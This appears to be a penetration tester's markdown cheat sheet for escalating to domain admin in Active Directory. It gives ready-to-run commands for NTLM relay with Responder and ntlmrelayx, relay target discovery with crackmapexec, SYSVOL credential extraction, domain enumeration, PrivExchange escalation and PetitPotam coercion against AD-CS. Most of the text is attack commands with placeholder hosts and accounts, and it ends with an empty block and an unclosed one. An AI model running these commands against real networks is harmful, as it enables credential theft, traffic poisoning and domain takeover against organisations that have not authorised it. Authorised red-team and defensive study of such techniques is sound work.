# Paths to domain admin

## NTLM Relay

### Active Directory Certificate Services
2 services in AD-CS are vulnerable to NTLM Relay:

1. CA Web Enrollment
2. Certificate Enrollment Web Service

With (privileged) access through NTLM Relay to these services, an attacker can request a new certificate and obtain *persistent* privileged access to other services & resources under the form of a certificate (which can be transformed in a Kerberos TGT with tools such as `kekeo` ).

### Generate list of potential target (Machine with SMB Signing disabled)
```shell
cme --timeout 3 smb 10.10.18.0/24 --gen-relay-list targets-10.10.16.0_24.txt
```

```shell
#/usr/bin/bash

functions=$(cat active-subnets.txt)
for function in $functions; do \
    cme --timeout 3 smb $function/24 --gen-relay-list targets-$function-24.txt & \
done;
```

### Use NTLM Relay with Responder

In one terminal have `ntlmrelayx.py` ready to relay connections
```shell
sudo ntlmrelayx.py -smb2support -tf smb-relay-targets.txt
```

in another console, have `responder` MITMing Windows host by poisoning LLMNR/NBT-NS
```shell
sudo responder -I myNetworkInterface -wrd
```
## Credentials in SYSVOL

### Metasploit

```shell
use auxiliary/scanner/smb/smb_enum_gpp
set rhosts <DC1>
set SMBUser myUser
set SMBPass myPass
run
```

### Manually
```shell
sudo mount -t cifs //10.10.10.1/SYSVOL /mnt -o username=myUser,password=myPass
```

## Enumerate Samba related information and rid

### enum4linux
```shell
enum4linux -a -u "myDomain\myUser" -p "myPassword" 10.220.2.9 | tee enum4linux.scan
```

### rpcclient
```shell
rpcclient -U "FR/NCB762" 10.220.2.9 -c "enumdomusers"
```

## PrivExchange
```shell
python privexchange.py -ah dev.myDomain.local myVulnerableExchangeServer.myDomain.local -u myUser -d myDomain.local
```
```shell
sudo ntlmrelayx.py -t myDomainController --escalate-user myUser
```

## PetitPotam
Attack starts when an unauthenticated (No domain credentials needed) attacker triggers a (potentially privileged) Windows host to authenticate to the attacker's host. They does it by requesting `EFS-RPC - Encrypted File System service` - to open a remote file on their own machine. Technically speaking, the attacker invokes `EfsRpcOpenFileRaw`, specifying a file path that points to their remote machine: `\\<attacker_address>\test\Settings.ini`.

Next, the attacker can perform an NTLM Relay attack (i.e. against AD-CS (Active Directory Certificate Services) and "impersonates" the victim machine. 
This part is based on `@SpecterOps` findings (ESC8 in https://posts.specterops.io/certified-pre-owned-d95910965cd2) and isn't PetitPotam-specific.

### Identify ADCS server
#### From Windows
```shell
certutil –config – -ping
```

#### From Linux
```shell
```

#### Check if LDAP signing is required

Can be done with: https://github.com/Rcarnus/ldap-scanner
```shell
python3 ldap-scanner.py myUser@myDomainController